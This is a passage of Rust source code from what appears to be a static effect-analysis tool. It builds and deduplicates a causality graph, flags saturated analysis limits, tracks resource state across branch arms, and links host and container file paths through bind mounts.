        let detail = match (graph.saturated_nodes, graph.saturated_edges) {
            (true, true) => "causality node and edge limits saturated",
            (true, false) => "causality node limit saturated",
            (false, true) => "causality edge limit saturated",
            (false, false) => unreachable!(),
        };
        let old_limit = graph.max_nodes;
        graph.max_nodes = usize::MAX;
        graph.node(
            origin(subject, execution_graph, None),
            ByteSpan { start: 0, end: 0 },
            "boundary:causality_widened".to_string(),
            OccurrenceKind::Boundary {
                reason: BoundaryReason::LIMIT_SATURATED,
                limit: Some("max_causal_graph".to_string()),
                detail: Some(detail.to_string()),
            },
            None,
            ExecutionRealm::Host,
            Modality::May,
            None,
            Vec::new(),
        );
        graph.nodes.last_mut().unwrap().cardinality = CausalCardinality::WIDENED;
        graph.max_nodes = old_limit;
    }

    // Serialize each edge's key once: conditions grow with a short-circuit
    // chain, and a comparator that serialized them per comparison made this
    // sort dominate analysis time.
    graph.edges.sort_by_cached_key(|edge| {
        (
            edge.from.clone(),
            edge.to.clone(),
            edge.reason,
            effinterp_proto::canonical_json(&edge.modality),
            effinterp_proto::canonical_json(&edge.condition),
            edge.cardinality.min,
            edge.cardinality.max,
            edge.assurance,
        )
    });
    let mut merged: Vec<CausalEdge> = Vec::with_capacity(graph.edges.len());
    for mut edge in graph.edges {
        if let Some(previous) = merged.last_mut()
            && previous.from == edge.from
            && previous.to == edge.to
            && previous.reason == edge.reason
            && previous.modality == edge.modality
            && previous.condition == edge.condition
            && previous.cardinality == edge.cardinality
        {
            previous.assurance = previous.assurance.min(edge.assurance);
            previous.provenance.append(&mut edge.provenance);
            previous.provenance.sort_unstable();
            previous.provenance.dedup();
        } else {
            merged.push(edge);
        }
    }
    graph.edges = merged;
    for (order, edge) in graph.edges.iter_mut().enumerate() {
        edge.order = order as u32;
    }
    let (depth_saturated, pairs_saturated) =
        causal_budget_saturation(&graph.nodes, &graph.edges, max_depth, max_pairs);
    for (saturated, semantic_kind, limit, detail) in [
        (
            depth_saturated,
            "boundary:causal_depth_widened",
            "max_causal_depth",
            "causal path depth widened",
        ),
        (
            pairs_saturated,
            "boundary:causal_pairs_widened",
            "max_causal_pairs",
            "reachable resource pair set widened",
        ),
    ] {
        if !saturated {
            continue;
        }
        coverage = effinterp_proto::CoverageLevel::Partial;
        let old_limit = graph.max_nodes;
        graph.max_nodes = usize::MAX;
        graph.node(
            origin(subject, execution_graph, None),
            ByteSpan { start: 0, end: 0 },
            semantic_kind.to_string(),
            OccurrenceKind::Boundary {
                reason: BoundaryReason::LIMIT_SATURATED,
                limit: Some(limit.to_string()),
                detail: Some(detail.to_string()),
            },
            None,
            ExecutionRealm::Host,
            Modality::May,
            None,
            Vec::new(),
        );
        graph.nodes.last_mut().unwrap().cardinality = CausalCardinality::WIDENED;
        graph.max_nodes = old_limit;
    }
    effinterp_proto::Causality {
        graph: Some(CausalityGraph {
            nodes: graph.nodes,
            edges: graph.edges,
        }),
        coverage: effinterp_proto::CoverageClaim {
            level: coverage,
            gaps: Vec::new(),
        },
    }
}

/// One branch arm an effect sits in: how deeply the construct nests, which
/// construct it is, which arm, and how many arms the construct has.
struct Branch {
    group: String,
    arm: usize,
    arms: usize,
}

/// Only conjunctively selected arms constrain the resource frontier.
fn branch_path(condition: Option<&effinterp_proto::Condition>) -> Vec<Branch> {
    fn collect<'a>(
        condition: &'a effinterp_proto::Condition,
        atoms: &mut Vec<&'a effinterp_proto::ConditionAtom>,
    ) {
        match condition {
            effinterp_proto::Condition::Atom { atom } => atoms.push(atom),
            effinterp_proto::Condition::All { conditions } => {
                for condition in conditions {
                    collect(condition, atoms);
                }
            }
            _ => (),
        }
    }
    let mut atoms = Vec::new();
    if let Some(condition) = condition {
        collect(condition, &mut atoms);
    }
    atoms.sort_by_key(|atom| {
        (
            atom.origin.span.start,
            std::cmp::Reverse(atom.origin.span.end),
        )
    });

    atoms
        .into_iter()
        .map(|atom| Branch {
            group: effinterp_proto::stable_hash("effinterp/condition-branch/v1", &atom.origin),
            arm: atom.arm as usize,
            arms: if atom.exhaustive {
                atom.arms as usize
            } else {
                atom.arms as usize + 1
            },
        })
        .collect()
}

fn condition_requires_short_circuit_success(
    condition: Option<&effinterp_proto::Condition>,
    span: effinterp_proto::ByteSpan,
) -> bool {
    match condition {
        Some(effinterp_proto::Condition::Atom { atom }) => {
            atom.origin.kind == effinterp_proto::ConditionKind::ShortCircuit
                && atom.origin.span == span
                && atom.polarity == Some(true)
        }
        Some(effinterp_proto::Condition::All { conditions }) => conditions
            .iter()
            .any(|condition| condition_requires_short_circuit_success(Some(condition), span)),
        Some(effinterp_proto::Condition::Any { conditions }) => {
            !conditions.is_empty()
                && conditions.iter().all(|condition| {
                    condition_requires_short_circuit_success(Some(condition), span)
                })
        }
        Some(effinterp_proto::Condition::Widened) | None => false,
    }
}

/// The occurrences that may hold the current state of one resource, tracked
/// across the branch constructs the effects sit in.
#[derive(Default)]
struct ResourceFrontier {
    current: Vec<usize>,
    open: Vec<OpenBranch>,
}

/// A branch construct the walk is inside: the state it was entered with, the
/// arm being walked, and the states the arms walked so far ended in.
struct OpenBranch {
    group: String,
    arm: usize,
    arms: usize,
    walked: usize,
    entry: Vec<usize>,
    exits: Vec<usize>,
}

impl ResourceFrontier {
    /// Move to `path`, leaving the constructs the next occurrence is no
    /// longer inside and entering the ones it is.
    fn enter(&mut self, path: &[Branch]) {
        let mut depth = 0;
        while depth < self.open.len()
            && depth < path.len()
            && self.open[depth].group == path[depth].group
        {
            depth += 1;
        }
        while self.open.len() > depth {
            self.leave();
        }
        // A sibling arm of the innermost construct still open: the arm just
        // walked ends here, and the next one starts from the entry state.
        if let Some(frame) = self.open.last_mut()
            && frame.arm != path[depth - 1].arm
        {
            frame.exits.append(&mut self.current);
            frame.arm = path[depth - 1].arm;
            frame.walked += 1;
            self.current = frame.entry.clone();
        }
        for branch in &path[depth..] {
            self.open.push(OpenBranch {
                group: branch.group.clone(),
                arm: branch.arm,
                arms: branch.arms,
                walked: 1,
                entry: self.current.clone(),
                exits: Vec::new(),
            });
        }
    }

    /// Leave the innermost construct: afterwards the state is whatever any of
    /// its arms left behind. Arms that touched the resource nowhere leave the
    /// entry state in place, so it survives too.
    fn leave(&mut self) {
        let Some(mut frame) = self.open.pop() else {
            return;
        };
        frame.exits.append(&mut self.current);
        if frame.walked < frame.arms {
            frame.exits.extend(frame.entry);
        }
        frame.exits.sort_unstable();
        frame.exits.dedup();
        self.current = frame.exits;
    }
}

fn causal_budget_saturation(
    nodes: &[effinterp_proto::OccurrenceNode],
    edges: &[effinterp_proto::CausalEdge],
    max_depth: usize,
    max_pairs: usize,
) -> (bool, bool) {
    use std::collections::{BTreeMap, BTreeSet, VecDeque};

    let resources: Vec<_> = nodes
        .iter()
        .filter(|node| {
            matches!(
                node.occurrence,
                effinterp_proto::OccurrenceKind::ResourceInteraction { .. }
            )
        })
        .map(|node| node.id.clone())
        .collect();
    let resource_set: BTreeSet<_> = resources.iter().cloned().collect();
    let mut adjacency: BTreeMap<_, Vec<_>> = BTreeMap::new();
    for edge in edges {
        adjacency
            .entry(edge.from.clone())
            .or_default()
            .push(edge.to.clone());
    }
    for successors in adjacency.values_mut() {
        successors.sort();
        successors.dedup();
    }

    let mut depth_saturated = false;
    let mut pairs_saturated = false;
    let mut pairs = 0usize;
    for start in resources {
        let mut visited = BTreeSet::from([start.clone()]);
        let mut pending = VecDeque::from([(start.clone(), 0usize)]);
        while let Some((node, depth)) = pending.pop_front() {
            let Some(successors) = adjacency.get(&node) else {
                continue;
            };
            if depth >= max_depth {
                depth_saturated |= successors
                    .iter()
                    .any(|successor| !visited.contains(successor));
                continue;
            }
            for successor in successors {
                if !visited.insert(successor.clone()) {
                    continue;
                }
                if successor != &start && resource_set.contains(successor) {
                    if pairs >= max_pairs {
                        pairs_saturated = true;
                    } else {
                        pairs += 1;
                    }
                }
                pending.push_back((successor.clone(), depth + 1));
            }
        }
    }
    (depth_saturated, pairs_saturated)
}

/// The concrete filesystem path an effect names, if it names one exactly.
/// Paths a host answered as a FIFO, by the identity the effects carry: the
/// answered entry when it is one itself, and the followed destination when a
/// final link leads to one. Only answers this analysis already asked for are
/// read; an unanswered or refused request keeps its own boundary and
/// establishes no lifetime here.
fn observed_fifo_paths(
    provenance: &[effinterp_proto::ProvenanceNode],
) -> std::collections::BTreeSet<String> {
    use effinterp_proto::{Fact, ObservationOutcome, PathKind, ProvenanceKind};
    let mut paths = std::collections::BTreeSet::new();
    for node in provenance {
        let ProvenanceKind::HostObservation {
            outcome: ObservationOutcome::Path(fact),
            ..
        } = &node.kind
        else {
            continue;
        };
        if fact.kind == PathKind::Fifo {
            paths.insert(fact.entry.clone());
        }
        if let Fact::Known(target) = &fact.followed
            && target.kind == Fact::Known(PathKind::Fifo)
        {
            paths.insert(target.path.clone());
        }
    }
    paths
}

fn concrete_fs_path(effect: &Effect) -> Option<&str> {
    match &effect.resource {
        ResourceExpr::Concrete {
            identity: effinterp_proto::ResourceIdentity::FsPath { path },
        } => Some(path),
        _ => None,
    }
}

/// Whether `member` lies strictly inside the directory `directory`.
fn fs_path_contains(directory: &str, member: &str) -> bool {
    let directory = directory.strip_suffix('/').unwrap_or(directory);
    member
        .strip_prefix(directory)
        .is_some_and(|rest| rest.starts_with('/') && rest.len() > 1)
}

fn resource_transition_key(effect: &Effect) -> Option<String> {
    fn has_single_resource_expression(resource: &ResourceExpr) -> bool {
        match resource {
            ResourceExpr::Concrete { .. } => true,
            ResourceExpr::Literal { .. }
            | ResourceExpr::Parameter { .. }
            | ResourceExpr::Environment { .. } => true,
            ResourceExpr::Property { base, .. } => has_single_resource_expression(base),
            ResourceExpr::Join { parts } => {
                !parts.is_empty() && parts.iter().all(has_single_resource_expression)
            }
            ResourceExpr::Union { .. }
            | ResourceExpr::Pattern { .. }
            | ResourceExpr::Unresolved { .. } => false,
        }
    }

    has_single_resource_expression(&effect.resource).then(|| {
        let execution = (!matches!(effect.resource, ResourceExpr::Concrete { .. }))
            .then_some(effect.execution.0);
        format!(
            "{}\u{1}{}\u{1}{}\u{1}{}",
            effinterp_proto::canonical_json(&effect.realm),
            effect.operation.domain(),
            effinterp_proto::canonical_json(&execution),
            effinterp_proto::canonical_json(&effinterp_proto::namespace_resource(&effect.resource))
        )
    })
}

fn launch_effect_matches(effect: &Effect, target: &effinterp_proto::ExecutionNode) -> bool {
    use effinterp_proto::{ResourceIdentity, Subject};
    match (&effect.resource, &target.subject) {
        (
            ResourceExpr::Concrete {
                identity: ResourceIdentity::Process { executable, .. },
            },
            Subject::Exec { argv, .. },
        ) => argv.first().is_some_and(|value| {
            value == executable || value.rsplit('/').next() == executable.rsplit('/').next()
        }),
        (
            ResourceExpr::Concrete {
                identity:
                    ResourceIdentity::Container {
                        runtime,
                        name,
                        image,
                        ..
                    },
            },
            _,
        ) => matches!(
            &target.realm,
            effinterp_proto::ExecutionRealm::Container { runtime: target_runtime, name: target_name }
                if target_runtime == runtime
                    && (name.as_ref() == Some(target_name) || image.as_ref() == Some(target_name))
        ),
        _ => false,
    }
}

fn execution_stream_port(stream: effinterp_proto::ExecutionStream) -> Port {
    match stream {
        effinterp_proto::ExecutionStream::Stdin => Port::Stdin,
        effinterp_proto::ExecutionStream::Stdout => Port::Stdout,
        effinterp_proto::ExecutionStream::Stderr => Port::Stderr,
    }
}

trait GraphSink {
    fn simple_edge(
        &mut self,
        from: Option<&effinterp_proto::OccurrenceId>,
        to: Option<&effinterp_proto::OccurrenceId>,
        reason: effinterp_proto::CausalReason,
        modality: Modality,
    );
}

fn add_mount_aliases(
    graph: &mut impl GraphSink,
    effects: &[Effect],
    effect_nodes: &[Option<effinterp_proto::OccurrenceId>],
) {
    use effinterp_proto::{CausalReason, ContainerStorage, ExecutionRealm, ResourceIdentity};
    for container in effects {
        let ResourceExpr::Concrete {
            identity:
                ResourceIdentity::Container {
                    runtime,
                    name,
                    image,
                    storage,
                },
        } = &container.resource
        else {
            continue;
        };
        let container_name = name.as_ref().or(image.as_ref());
        for mount in storage {
            let ContainerStorage::BindMount {
                host_path,
                container_path,
                ..
            } = mount
            else {
                continue;
            };
            let (Some(host_root), Some(container_root)) =
                (concrete_path(host_path), concrete_path(container_path))
            else {
                continue;
            };
            for (host_index, host_effect) in effects.iter().enumerate() {
                if host_effect.realm != ExecutionRealm::Host {
                    continue;
                }
                let Some(host_path) = concrete_path(&host_effect.resource) else {
                    continue;
                };
                let Some(suffix) = path_suffix(host_path, host_root) else {
                    continue;
                };
                for (guest_index, guest_effect) in effects.iter().enumerate() {
                    if !matches!(
                        &guest_effect.realm,
                        ExecutionRealm::Container { runtime: guest_runtime, name: guest_name }
                            if guest_runtime == runtime
                                && container_name.is_some_and(|name| name == guest_name)
                    ) {
                        continue;
                    }
                    let Some(guest_path) = concrete_path(&guest_effect.resource) else {
                        continue;
                    };
                    if path_suffix(guest_path, container_root) != Some(suffix) {
                        continue;
                    }
                    let host = effect_nodes.get(host_index).and_then(Option::as_ref);
                    let guest = effect_nodes.get(guest_index).and_then(Option::as_ref);
                    graph.simple_edge(host, guest, CausalReason::Alias, Modality::May);
                    graph.simple_edge(guest, host, CausalReason::Alias, Modality::May);
                }
            }
        }
    }
}

fn concrete_path(resource: &ResourceExpr) -> Option<&str> {
    match resource {
        ResourceExpr::Concrete {
            identity: effinterp_proto::ResourceIdentity::FsPath { path },
        } => Some(path),
        _ => None,
    }
}

fn path_suffix<'a>(path: &'a str, root: &str) -> Option<&'a str> {
    if path == root {
        Some("")
    } else {
        path.strip_prefix(root)?.strip_prefix('/')
    }
}
